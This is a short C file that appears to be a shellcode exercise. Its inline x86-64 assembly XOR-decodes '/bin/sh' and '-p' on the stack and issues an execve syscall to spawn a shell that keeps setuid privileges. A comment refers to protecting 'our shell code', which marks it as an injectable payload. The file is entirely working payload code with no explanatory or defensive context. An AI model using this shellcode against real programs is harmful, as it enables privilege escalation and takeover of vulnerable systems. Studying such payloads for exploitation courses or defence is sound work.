#include <stdio.h>

int main( )
{
  asm("add $40, %rsp"); // Make sure our push-es do not overwrite our shell code

  asm("movabsq $0x1111111111111111, %rax"); // used for xor
  asm("movabsq $0x1179623e7f78733e, %r12"); // "/bin/sh\0"
  asm("movabsq $0x111111111111613c, %r13"); // "-p\0\0\0\0\0\0"
  asm("xor %rax, %r12");
  asm("push %r12");
  asm("mov %rsp, %r12"); // r12 now contains a pointer to "/bin/sh"
  
  asm("xor %rax, %r13");
  asm("push %r13");
  asm("mov %rsp, %r13"); // r13 now contains a pointer to "-p"

  // First argument: rdi
  asm("mov %r12, %rdi");

  // second argument: rsi
  asm("xor %rax, %rax");
  asm("push %rax");
  asm("push %r13");
  asm("push %r12");
  asm("mov %rsp, %rsi");

  // third argumet: rdx
  asm("xor %rdx, %rdx");

  // execve
  asm("mov  $59, %al");
  asm("syscall");

  return 0;
}
